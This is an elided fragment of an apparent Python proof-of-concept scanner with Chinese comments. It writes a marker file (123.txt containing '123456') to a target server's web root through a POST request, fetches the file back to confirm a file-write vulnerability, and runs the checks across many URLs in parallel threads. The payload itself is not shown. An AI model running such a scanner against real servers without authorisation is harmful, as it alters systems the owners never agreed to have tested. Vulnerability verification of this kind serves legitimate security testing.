...
def check_vuln(url):
    ...
    try:
        #写入123456到根目录123.txt
        requests.post(target_url, headers=headers, json=payload, verify=False, proxies=proxies, timeout=4)
        #检查shi是否返回123456
        check_url = f"{url}/123.txt"
        response = requests.get(check_url, proxies=proxies, verify=False, timeout=4)
        if "123456" in response.text:
            print("存在漏洞")
...
def main():
    ...
    with concurrent.futures.ThreadPoolExecutor() as  executor:
        #executor = concurrent.futures.ThreadPoolExecutor(max_workers=5)  #可自定义线程数
